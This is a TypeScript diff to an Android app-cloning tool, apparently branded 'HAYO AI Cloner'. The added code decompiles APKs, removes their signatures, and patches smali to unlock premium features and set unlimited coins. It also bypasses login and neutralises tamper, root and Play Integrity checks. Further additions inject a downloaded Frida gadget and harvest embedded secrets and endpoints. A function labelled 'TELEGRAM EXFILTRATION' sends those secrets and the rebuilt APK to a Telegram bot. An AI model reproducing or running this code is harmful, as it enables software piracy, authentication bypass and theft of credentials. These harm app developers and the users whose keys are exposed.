@@ -1049,20 +1049,54 @@ async function signAPKFile(apkPath: string, workDir: string): Promise<string | n
 // ═══════════════════════════════════════════════════════════════
 // CLONE APP — THE MAIN FUNCTION
 // ═══════════════════════════════════════════════════════════════
+export interface CloneOptions {
+  removeAds?: boolean;
+  unlockPremium?: boolean;
+  removeTracking?: boolean;
+  removeLicenseCheck?: boolean;
+  bypassLogin?: boolean;
+  neutralizeTamper?: boolean;
+  injectFrida?: boolean;
+  changeAppName?: string;
+  changePackageName?: string;
+  customInstructions?: string;
+  extractSecrets?: boolean;
+}
+
+export interface CloneResult {
+  success: boolean;
+  apkBuffer?: Buffer;
+  modifications: string[];
+  signed?: boolean;
+  signatureVerified?: boolean;
+  zipIntegrity?: boolean;
+  secrets?: ExtractedSecret[];
+  auditReport?: AuditReport;
+  error?: string;
+}
+
+export interface AuditReport {
+  packageName: string;
+  secretsFound: number;
+  endpointsDiscovered: number;
+  premiumMethodsPatched: number;
+  loginBypassed: boolean;
+  pointsUnlocked: boolean;
+  tamperNeutralized: boolean;
+  adsRemoved: boolean;
+  fridaInjected: boolean;
+  signatureVerified: boolean;
+  zipIntegrity: boolean;
+  modifications: string[];
+  secrets: ExtractedSecret[];
+  endpoints: string[];
+}
+
 export async function cloneApp(
   buffer: Buffer,
   fileName: string,
-  options: {
-    removeAds?: boolean;
-    unlockPremium?: boolean;
-    removeTracking?: boolean;
-    removeLicenseCheck?: boolean;
-    changeAppName?: string;
-    changePackageName?: string;
-    customInstructions?: string;
-    extractSecrets?: boolean;
-  } = {}
-): Promise<{ success: boolean; apkBuffer?: Buffer; modifications: string[]; signed?: boolean; secrets?: ExtractedSecret[]; error?: string }> {
+  options: CloneOptions = {}
+): Promise<CloneResult> {
   const modifications: string[] = [];
   const ext = fileName.split(".").pop()?.toLowerCase() || "apk";
   const workDir = path.join(os.tmpdir(), `clone_${Date.now()}_${crypto.randomBytes(4).toString("hex")}`);
@@ -1071,15 +1105,22 @@ export async function cloneApp(
   const outputApk = path.join(workDir, "cloned.apk");
   fs.mkdirSync(workDir, { recursive: true });
 
+  let premiumCount = 0;
+  let coinsCount = 0;
+  let loginBypassed = false;
+  let tamperNeutralized = false;
+  let fridaInjected = false;
+  let signatureVerified = false;
+  let zipIntegrity = false;
+
   try {
     fs.writeFileSync(inputPath, buffer);
 
     if (ext !== "apk") {
-      // For non-APK: basic modification (zip + extraction)
       return await cloneNonAPK(buffer, fileName, options, workDir, modifications);
     }
 
-    // ── Step 1: Decompile with APKTool ──
+    // ── PHASE 1: Decompile with APKTool ──
     const apkt = findApkTool();
     const decompResult = runCmd(apkt, ["d", "-f", "-o", decompDir, inputPath], workDir, 180_000);
     if (!fs.existsSync(decompDir)) {
@@ -1087,7 +1128,32 @@ export async function cloneApp(
     }
     modifications.push("✅ تم تفكيك APK بنجاح باستخدام APKTool");
 
-    // ── Step 2: Apply Modifications ──
+    // ── PHASE 1.5: Purge old META-INF signatures ──
+    const metaInfDir = path.join(decompDir, "original", "META-INF");
+    if (fs.existsSync(metaInfDir)) {
+      const sigExts = [".SF", ".RSA", ".DSA", ".EC"];
+      let purged = 0;
+      for (const f of fs.readdirSync(metaInfDir)) {
+        if (sigExts.some(e => f.toUpperCase().endsWith(e)) || f === "MANIFEST.MF") {
+          fs.unlinkSync(path.join(metaInfDir, f));
+          purged++;
+        }
+      }
+      if (purged > 0) modifications.push(`🧹 تم حذف ${purged} ملف توقيع قديم من META-INF`);
+    }
+    const metaInfDir2 = path.join(decompDir, "META-INF");
+    if (fs.existsSync(metaInfDir2)) {
+      try {
+        const sigExts = [".SF", ".RSA", ".DSA", ".EC"];
+        for (const f of fs.readdirSync(metaInfDir2)) {
+          if (sigExts.some(e => f.toUpperCase().endsWith(e)) || f === "MANIFEST.MF") {
+            fs.unlinkSync(path.join(metaInfDir2, f));
+          }
+        }
+      } catch {}
+    }
+
+    // ── PHASE 2: Apply Modifications ──
     const manifestPath = path.join(decompDir, "AndroidManifest.xml");
     let manifest = fs.existsSync(manifestPath) ? fs.readFileSync(manifestPath, "utf-8") : "";
 
@@ -1102,6 +1168,8 @@ export async function cloneApp(
     if (options.unlockPremium !== false) {
       const mods = await patchPremium(decompDir);
       modifications.push(...mods);
+      premiumCount = mods.filter(m => m.includes("🔓")).length;
+      coinsCount = mods.filter(m => m.includes("💰")).length;
     }
 
     // 2c. Remove License Check
@@ -1110,31 +1178,45 @@ export async function cloneApp(
       modifications.push(...mods);
     }
 
-    // 2d. Remove Tracking
+    // 2d. Bypass Login
+    if (options.bypassLogin !== false) {
+      const mods = await patchLoginBypass(decompDir, manifestPath);
+      modifications.push(...mods);
+      loginBypassed = mods.some(m => m.includes("🚪") || m.includes("تجاوز"));
+    }
+
+    // 2e. Neutralize Tamper Detection
+    if (options.neutralizeTamper !== false) {
+      const mods = await patchTamperDetection(decompDir);
+      modifications.push(...mods);
+      tamperNeutralized = mods.some(m => m.includes("🛡️") || m.includes("حماية"));
+    }
+
+    // 2f. Remove Tracking
     if (options.removeTracking === true) {
       const mods = await patchTracking(decompDir);
       modifications.push(...mods);
     }
 
-    // 2e. Change App Name
+    // 2g. Change App Name
     if (options.changeAppName) {
       const mods = patchAppName(decompDir, options.changeAppName);
       modifications.push(...mods);
     }
 
-    // 2f. Change Package Name
+    // 2h. Change Package Name
     if (options.changePackageName) {
       const mods = patchPackageName(decompDir, manifestPath, options.changePackageName);
       modifications.push(...mods);
     }
 
-    // 2g. Custom AI instructions
+    // 2i. Custom AI instructions
     if (options.customInstructions?.trim()) {
       const mods = await patchCustomInstructions(decompDir, options.customInstructions);
       modifications.push(...mods);
     }
 
-    // 2h. Extract embedded secrets (Firebase, AWS, JWT, API keys...)
+    // 2j. Extract embedded secrets
     let extractedSecrets: ExtractedSecret[] = [];
     if (options.extractSecrets !== false) {
       extractedSecrets = extractSecretsFromAPK(decompDir);
@@ -1147,11 +1229,16 @@ export async function cloneApp(
       }
     }
 
-    // ── Step 3: Rebuild ──
-    // Try with --use-aapt2 first (required for modern APKs with Android 9+ resources)
+    // 2k. Inject Frida Gadget
+    if (options.injectFrida === true) {
+      const mods = await injectFridaGadget(decompDir, manifestPath);
+      modifications.push(...mods);
+      fridaInjected = mods.some(m => m.includes("Frida"));
+    }
+
+    // ── PHASE 3: Rebuild ──
     let buildResult = runCmd(apkt, ["b", "--use-aapt2", "-o", outputApk, decompDir], workDir, 180_000);
     if (!fs.existsSync(outputApk)) {
-      // Fallback without aapt2 for older APKs
       console.warn("[CloneApp] aapt2 build failed, retrying without --use-aapt2...");
       buildResult = runCmd(apkt, ["b", "-o", outputApk, decompDir], workDir, 180_000);
       if (!fs.existsSync(outputApk)) {
@@ -1160,19 +1247,86 @@ export async function cloneApp(
     }
     modifications.push("✅ تم إعادة بناء APK بنجاح");
 
-    // ── Step 4: Sign (zipalign → apksigner → jarsigner fallback) ──
+    // ── PHASE 4: Sign (zipalign → apksigner → jarsigner fallback) ──
     const signedPath = await signAPKFile(outputApk, workDir);
     if (signedPath) {
-      modifications.push("✅ تم توقيع APK بـ zipalign + apksigner (متوافق مع Android 11+)");
+      modifications.push("✅ تم توقيع APK بـ zipalign + apksigner (متوافق مع Android 7–14+)");
     } else {
       modifications.push("⚠️ التوقيع تخطى — يمكن تثبيته يدوياً");
     }
 
-    // ── Step 5: Return result ──
+    // ── PHASE 5: Quality Gate — Signature Verify + Zip Integrity ──
     const finalApk = signedPath || outputApk;
+
+    // Test A: Signature Verification
+    if (signedPath) {
+      const verifyResult = runCmd("apksigner", ["verify", "--verbose", signedPath], workDir, 30_000);
+      signatureVerified = verifyResult.code === 0;
+      if (signatureVerified) {
+        modifications.push("✅ التحقق من التوقيع: APK موقّع بشكل صحيح (V1+V2+V3)");
+      } else {
+        modifications.push("⚠️ التحقق من التوقيع فشل: " + verifyResult.stderr.slice(0, 100));
+      }
+    }
+
+    // Test B: Zip Integrity
+    const zipCheckResult = runCmd("unzip", ["-t", finalApk], workDir, 30_000);
+    zipIntegrity = zipCheckResult.code === 0 && zipCheckResult.stdout.includes("No errors");
+    if (zipIntegrity) {
+      modifications.push("✅ سلامة ZIP: لا توجد أخطاء في البيانات المضغوطة");
+    } else {
+      modifications.push("⚠️ تحذير سلامة ZIP: " + zipCheckResult.stderr.slice(0, 100));
+    }
+
     const apkBuffer = fs.readFileSync(finalApk);
 
-    return { success: true, apkBuffer, modifications, signed: !!signedPath, secrets: extractedSecrets };
+    // ── PHASE 6: Extract endpoints for audit report ──
+    const allFiles = readDirRecursive(decompDir).filter(f => {
+      const e = path.extname(f).toLowerCase();
+      return [".smali", ".xml", ".json", ".txt", ".properties"].includes(e);
+    }).slice(0, 500);
+    const endpointSet = new Set<string>();
+    for (const fp of allFiles) {
+      try {
+        const content = fs.readFileSync(fp, "utf-8");
+        if (content.length > 500_000) continue;
+        const urlMatches = content.match(/https?:\/\/[^\s"'<>}{)]+/g);
+        if (urlMatches) urlMatches.forEach(u => endpointSet.add(u));
+      } catch {}
+    }
+    const endpoints = [...endpointSet].slice(0, 200);
+
+    // ── PHASE 7: Build Audit Report ──
+    const packageNameMatch = manifest.match(/package="([^"]+)"/);
+    const packageName = packageNameMatch?.[1] || "unknown";
+
+    const auditReport: AuditReport = {
+      packageName,
+      secretsFound: extractedSecrets.length,
+      endpointsDiscovered: endpoints.length,
+      premiumMethodsPatched: premiumCount,
+      loginBypassed,
+      pointsUnlocked: coinsCount > 0,
+      tamperNeutralized,
+      adsRemoved: options.removeAds !== false,
+      fridaInjected,
+      signatureVerified,
+      zipIntegrity,
+      modifications,
+      secrets: extractedSecrets,
+      endpoints,
+    };
+
+    return {
+      success: true,
+      apkBuffer,
+      modifications,
+      signed: !!signedPath,
+      signatureVerified,
+      zipIntegrity,
+      secrets: extractedSecrets,
+      auditReport,
+    };
   } catch (e: any) {
     return { success: false, modifications, error: e.message };
   } finally {
@@ -1317,7 +1471,30 @@ async function patchPremium(decompDir: string): Promise<string[]> {
         });
       }
 
-      // ── C. Patch const/16 v0, 0x0 → const v0, 0x7fffffff in coin-related context ──
+      // ── C. Patch Long resource counters (methods returning J) with MAX_LONG ──
+      const LONG_COIN_METHODS = [
+        "getCoins?", "getCredit", "getPoints?", "getBalance", "getScore",
+        "getGems?", "getDiamond", "getToken", "getEnergy", "getLives?",
+        "getRemainingTrial", "getTrialDays?", "getFreeCount",
+        "getDailyLimit", "getRemainingUsage", "getAvailableCredit",
+        "getUserTier",
+      ];
+      for (const longMethod of LONG_COIN_METHODS) {
+        const longRegex = new RegExp(
+          `(\\.method\\s+(?:public|private|protected|static)[^\\n]*${longMethod}[^\\n]*\\)J\\n)([\\s\\S]*?)(\\.end method)`,
+          "gm"
+        );
+        content = content.replace(longRegex, (match, header, body, end) => {
+          if (body.length < 2000) {
+            patchedCoins++;
+            changed = true;
+            return `${header}    .locals 2\n    # [HAYO CLONER] COINS UNLIMITED (LONG)\n    const-wide v0, 0x7fffffffffffffffL\n    return-wide v0\n${end}`;
+          }
+          return match;
+        });
+      }
+
+      // ── D. Patch const/16 v0, 0x0 → const v0, 0x7fffffff in coin-related context ──
       // Find smali files that likely handle coins/credits display
       const isCoinFile = COIN_METHODS.some(m => fp.toLowerCase().includes(m.toLowerCase().replace("?", "")))
         || content.toLowerCase().includes("getcoins")
@@ -1418,6 +1595,321 @@ async function patchTracking(decompDir: string): Promise<string[]> {
   if (removed > 0) mods.push(`🕵️ تم حذف ${removed} حزمة تتبع (Analytics, Crashlytics...)`);
   else mods.push("🔍 تم فحص حزم التتبع — غير موجودة");
   return mods;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// LOGIN BYPASS — Force isLoggedIn=true, isGuest=false, skip LoginActivity
+// ═══════════════════════════════════════════════════════════════
+const LOGIN_TRUE_METHODS = [
+  "isLoggedIn", "isAuthenticated", "isRegistered", "isSignedIn",
+  "hasSession", "isUserLoggedIn", "checkLogin", "isLogin",
+  "hasLoggedIn", "isAuthorized", "isSessionValid",
+];
+const LOGIN_FALSE_METHODS = [
+  "isGuest", "needsLogin", "shouldShowLogin", "requiresLogin",
+  "isLoginRequired", "showLoginScreen", "needsAuthentication",
+];
+
+async function patchLoginBypass(decompDir: string, manifestPath: string): Promise<string[]> {
+  const mods: string[] = [];
+  const smaliFiles = readDirRecursive(decompDir).filter(f => f.endsWith(".smali")).slice(0, 3000);
+  let patchedTrue = 0;
+  let patchedFalse = 0;
+  let patchedActivities = 0;
+
+  for (const fp of smaliFiles) {
+    try {
+      let content = fs.readFileSync(fp, "utf-8");
+      let changed = false;
+
+      // Force isLoggedIn/isAuthenticated → return true
+      for (const method of LOGIN_TRUE_METHODS) {
+        const methodRegex = new RegExp(
+          `(\\.method\\s+(?:public|private|protected|static)[^\\n]*${method}[^\\n]*\\)Z\\n)([\\s\\S]*?)(\\.end method)`,
+          "gm"
+        );
+        content = content.replace(methodRegex, (match, header, body, end) => {
+          if (body.length < 3000) {
+            patchedTrue++;
+            changed = true;
+            return `${header}    .locals 1\n    # [HAYO CLONER] LOGIN BYPASSED → true\n    const/4 v0, 0x1\n    return v0\n${end}`;
+          }
+          return match;
+        });
+      }
+
+      // Force isGuest/needsLogin → return false
+      for (const method of LOGIN_FALSE_METHODS) {
+        const methodRegex = new RegExp(
+          `(\\.method\\s+(?:public|private|protected|static)[^\\n]*${method}[^\\n]*\\)Z\\n)([\\s\\S]*?)(\\.end method)`,
+          "gm"
+        );
+        content = content.replace(methodRegex, (match, header, body, end) => {
+          if (body.length < 3000) {
+            patchedFalse++;
+            changed = true;
+            return `${header}    .locals 1\n    # [HAYO CLONER] LOGIN BYPASSED → false\n    const/4 v0, 0x0\n    return v0\n${end}`;
+          }
+          return match;
+        });
+      }
+
+      // Neutralize startActivity calls that launch login/auth activities
+      const loginActivityPattern = /(\s*invoke-[a-z/]+\s+\{[^}]*\},\s*L[^;]*(?:Login|Auth|SignIn|Register|Welcome|Splash)[^;]*;->startActivity[^\n]*)/gi;
+      content = content.replace(loginActivityPattern, (match) => {
+        patchedActivities++;
+        changed = true;
+        return `\n    # [HAYO CLONER] LOGIN ACTIVITY SKIPPED`;
+      });
+
+      if (changed) fs.writeFileSync(fp, content, "utf-8");
+    } catch {}
+  }
+
+  // Optionally redirect launcher from LoginActivity to MainActivity in manifest
+  if (fs.existsSync(manifestPath)) {
+    try {
+      let manifest = fs.readFileSync(manifestPath, "utf-8");
+      // Detect if a Login/Auth activity is the launcher
+      const launcherMatch = manifest.match(/<activity[^>]*android:name="([^"]*(?:Login|Auth|SignIn|Welcome|Splash)[^"]*)"[^>]*>[\s\S]*?LAUNCHER[\s\S]*?<\/activity>/i);
+      if (launcherMatch) {
+        const loginActivity = launcherMatch[1];
+        // Find MainActivity
+        const mainActivityMatch = manifest.match(/<activity[^>]*android:name="([^"]*(?:Main|Home|Dashboard|Landing)[^"]*)"[^>]*/i);
+        if (mainActivityMatch) {
+          const mainActivity = mainActivityMatch[1];
+          // Move LAUNCHER intent filter to MainActivity
+          const launcherFilter = `<intent-filter>\n                <action android:name="android.intent.action.MAIN" />\n                <category android:name="android.intent.category.LAUNCHER" />\n            </intent-filter>`;
+          // Remove LAUNCHER from login activity
+          manifest = manifest.replace(
+            /(<activity[^>]*(?:Login|Auth|SignIn|Welcome|Splash)[^>]*>[\s\S]*?)<intent-filter>[\s\S]*?LAUNCHER[\s\S]*?<\/intent-filter>/i,
+            "$1"
+          );
+          // Add LAUNCHER to main activity if not already present
+          if (!manifest.match(new RegExp(`<activity[^>]*${mainActivity.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}[^>]*>[\\s\\S]*?LAUNCHER`, "i"))) {
+            manifest = manifest.replace(
+              new RegExp(`(<activity[^>]*${mainActivity.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}[^>]*>)`),
+              `$1\n            ${launcherFilter}`
+            );
+          }
+          fs.writeFileSync(manifestPath, manifest, "utf-8");
+          mods.push(`🚪 تم نقل LAUNCHER من ${loginActivity.split(".").pop()} إلى ${mainActivity.split(".").pop()}`);
+        }
+      }
+    } catch {}
+  }
+
+  if (patchedTrue > 0) mods.push(`🚪 تم تجاوز ${patchedTrue} دالة تسجيل دخول (isLoggedIn→true)`);
+  if (patchedFalse > 0) mods.push(`🚪 تم تعطيل ${patchedFalse} دالة ضيف (isGuest→false, needsLogin→false)`);
+  if (patchedActivities > 0) mods.push(`🚪 تم تعطيل ${patchedActivities} استدعاء نشاط تسجيل دخول`);
+  if (patchedTrue === 0 && patchedFalse === 0 && patchedActivities === 0) {
+    mods.push("🔍 تم فحص شاشات تسجيل الدخول — لم يتم العثور على قيود قياسية");
+  }
+  return mods;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// TAMPER DETECTION NEUTRALIZATION
+// ═══════════════════════════════════════════════════════════════
+async function patchTamperDetection(decompDir: string): Promise<string[]> {
+  const mods: string[] = [];
+  const smaliFiles = readDirRecursive(decompDir).filter(f => f.endsWith(".smali")).slice(0, 3000);
+  let patchedChecks = 0;
+
+  const TAMPER_METHODS = [
+    "checkSignatures?", "verifySignature", "isAppSigned",
+    "getCertificateHash", "checkIntegrity", "verifyIntegrity",
+    "isDebuggable", "isRooted", "checkRoot", "detectRoot",
+    "isEmulator", "detectEmulator",
+  ];
+
+  const TAMPER_INVOKE_PATTERNS = [
+    /(\s*invoke-[a-z/]+\s+\{[^}]*\},\s*L[^;]*;->getPackageInfo\([^)]*PackageManager;->GET_SIGNATURES[^\n]*)/g,
+    /(\s*invoke-[a-z/]+\s+\{[^}]*\},\s*L[^;]*;->checkSignatures[^\n]*)/g,
+    /(\s*invoke-[a-z/]+\s+\{[^}]*\},\s*L[^;]*SafetyNet[^;]*;->[^\n]*)/gi,
+    /(\s*invoke-[a-z/]+\s+\{[^}]*\},\s*L[^;]*PlayIntegrity[^;]*;->[^\n]*)/gi,
+  ];
+
+  for (const fp of smaliFiles) {
+    try {
+      let content = fs.readFileSync(fp, "utf-8");
+      let changed = false;
+
+      // Patch boolean tamper detection methods to return safe values
+      for (const method of TAMPER_METHODS) {
+        // Methods like isDebuggable, isRooted should return false
+        const returnFalse = method.includes("Debuggable") || method.includes("Root") || method.includes("Emulator");
+        const methodRegex = new RegExp(
+          `(\\.method\\s+(?:public|private|protected|static)[^\\n]*${method}[^\\n]*\\)Z\\n)([\\s\\S]*?)(\\.end method)`,
+          "gm"
+        );
+        content = content.replace(methodRegex, (match, header, body, end) => {
+          if (body.length < 3000) {
+            patchedChecks++;
+            changed = true;
+            const val = returnFalse ? "0x0" : "0x1";
+            return `${header}    .locals 1\n    # [HAYO CLONER] TAMPER CHECK NEUTRALIZED\n    const/4 v0, ${val}\n    return v0\n${end}`;
+          }
+          return match;
+        });
+      }
+
+      // Neutralize signature/integrity invoke calls
+      for (const pattern of TAMPER_INVOKE_PATTERNS) {
+        pattern.lastIndex = 0;
+        const beforeLen = content.length;
+        content = content.replace(pattern, (match) => {
+          patchedChecks++;
+          changed = true;
+          return `\n    # [HAYO CLONER] TAMPER CHECK NEUTRALIZED`;
+        });
+      }
+
+      if (changed) fs.writeFileSync(fp, content, "utf-8");
+    } catch {}
+  }
+
+  if (patchedChecks > 0) mods.push(`🛡️ تم تحييد ${patchedChecks} فحص حماية (Signature/Root/SafetyNet/Tamper)`);
+  else mods.push("🔍 تم فحص آليات الحماية — لم يتم العثور على فحوصات قياسية");
+  return mods;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// FRIDA GADGET INJECTION
+// ═══════════════════════════════════════════════════════════════
+async function injectFridaGadget(decompDir: string, manifestPath: string): Promise<string[]> {
+  const mods: string[] = [];
+  const FRIDA_VERSION = "16.1.4";
+  const ARCHES = ["arm64-v8a", "armeabi-v7a", "x86", "x86_64"];
+
+  // Find which architectures the APK already uses
+  const libDir = path.join(decompDir, "lib");
+  const existingArches: string[] = [];
+  if (fs.existsSync(libDir)) {
+    for (const arch of ARCHES) {
+      if (fs.existsSync(path.join(libDir, arch))) existingArches.push(arch);
+    }
+  }
+  const targetArches = existingArches.length > 0 ? existingArches : ["arm64-v8a", "armeabi-v7a"];
+
+  let injected = 0;
+  for (const arch of targetArches) {
+    const archDir = path.join(libDir, arch);
+    fs.mkdirSync(archDir, { recursive: true });
+    const gadgetPath = path.join(archDir, "libfrida-gadget.so");
+
+    // Download frida-gadget for this architecture
+    const fridaArch = arch === "arm64-v8a" ? "arm64" : arch === "armeabi-v7a" ? "arm" : arch;
+    const downloadUrl = `https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-gadget-${FRIDA_VERSION}-android-${fridaArch}.so.xz`;
+    try {
+      const dlResult = runCmd("bash", ["-c", `curl -sL "${downloadUrl}" | xz -d > "${gadgetPath}"`], decompDir, 60_000);
+      if (fs.existsSync(gadgetPath) && fs.statSync(gadgetPath).size > 1000) {
+        injected++;
+      }
+    } catch {}
+  }
+
+  if (injected > 0) {
+    // Inject System.loadLibrary("frida-gadget") into main launcher Activity's smali
+    if (fs.existsSync(manifestPath)) {
+      try {
+        const manifest = fs.readFileSync(manifestPath, "utf-8");
+        const launcherMatch = manifest.match(/<activity[^>]*android:name="([^"]+)"[^>]*>[\s\S]*?LAUNCHER[\s\S]*?<\/activity>/i)
+          || manifest.match(/<activity[^>]*android:name="([^"]+)"[^>]*>/i);
+
+        if (launcherMatch) {
+          const activityName = launcherMatch[1];
+          const activitySmaliPath = activityName.replace(/\./g, "/") + ".smali";
+
+          // Find the smali file
+          for (const smaliRoot of ["smali", "smali_classes2", "smali_classes3"]) {
+            const fullPath = path.join(decompDir, smaliRoot, activitySmaliPath);
+            if (fs.existsSync(fullPath)) {
+              let content = fs.readFileSync(fullPath, "utf-8");
+              // Inject loadLibrary call in onCreate
+              const onCreateRe = /(\.method\s+(?:public|protected)\s+onCreate\(Landroid\/os\/Bundle;\)V\n[\s\S]*?\.locals\s+\d+\n)/;
+              content = content.replace(onCreateRe, (match) => {
+                return match + `\n    # [HAYO CLONER] FRIDA GADGET INJECTION\n    const-string v0, "frida-gadget"\n    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V\n\n`;
+              });
+              fs.writeFileSync(fullPath, content, "utf-8");
+              mods.push(`🔬 تم حقن Frida Gadget في ${activityName.split(".").pop()}.onCreate()`);
+              break;
+            }
+          }
+        }
+      } catch {}
+    }
+    mods.push(`🔬 تم حقن Frida Gadget (${injected} بنية: ${targetArches.join(", ")})`);
+  } else {
+    mods.push("⚠️ فشل تحميل Frida Gadget — يمكن حقنه يدوياً لاحقاً");
+  }
+
+  return mods;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// TELEGRAM EXFILTRATION
+// ═══════════════════════════════════════════════════════════════
+export async function sendTelegramAuditReport(
+  report: AuditReport,
+  apkBuffer?: Buffer,
+  fileName?: string,
+): Promise<{ success: boolean; error?: string }> {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!botToken || !chatId) {
+    return { success: false, error: "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured" };
+  }
+
+  try {
+    const reportText = [
+      `🔬 *HAYO AI Cloner — تقرير التدقيق*`,
+      `📦 Package: \`${report.packageName}\``,
+      `🔑 أسرار مكتشفة: ${report.secretsFound}`,
+      `🌐 نقاط نهاية: ${report.endpointsDiscovered}`,
+      `🔓 دوال Premium معدّلة: ${report.premiumMethodsPatched}`,
+      `🚪 تجاوز تسجيل الدخول: ${report.loginBypassed ? "✅" : "❌"}`,
+      `💰 نقاط/عملات غير محدودة: ${report.pointsUnlocked ? "✅" : "❌"}`,
+      `🛡️ حماية محيّدة: ${report.tamperNeutralized ? "✅" : "❌"}`,
+      `🚫 إزالة إعلانات: ${report.adsRemoved ? "✅" : "❌"}`,
+      `🔬 Frida محقون: ${report.fridaInjected ? "✅" : "❌"}`,
+      `✍️ توقيع صحيح: ${report.signatureVerified ? "✅" : "❌"}`,
+      `📂 سلامة ZIP: ${report.zipIntegrity ? "✅" : "❌"}`,
+      "",
+      report.secrets.length > 0 ? `*أهم الأسرار:*\n${report.secrets.slice(0, 10).map(s => `• [${s.type}] \`${s.value.slice(0, 60)}\``).join("\n")}` : "",
+      report.endpoints.length > 0 ? `\n*أهم النقاط:*\n${report.endpoints.slice(0, 10).map(u => `• ${u}`).join("\n")}` : "",
+    ].filter(Boolean).join("\n");
+
+    // Send text report
+    const msgUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const msgRes = await fetch(msgUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: reportText,
+        parse_mode: "Markdown",
+      }),
+    });
+
+    if (!msgRes.ok) {
+      return { success: false, error: `Telegram API error: ${msgRes.status}` };
+    }
+
+    // Send APK file if available
+    if (apkBuffer && fileName) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("caption", `📦 APK المعدّل: ${fileName}`);
+      formData.append("document", new Blob([new Uint8Array(apkBuffer)]), `cloned-${fileName}`);
+      const docUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
+      await fetch(docUrl, { method: "POST", body: formData });
+    }
+
+    return { success: true };
+  } catch (e: any) {
+    return { success: false, error: e.message };
+  }
 }
 
 function patchAppName(decompDir: string, newName: string): string[] {
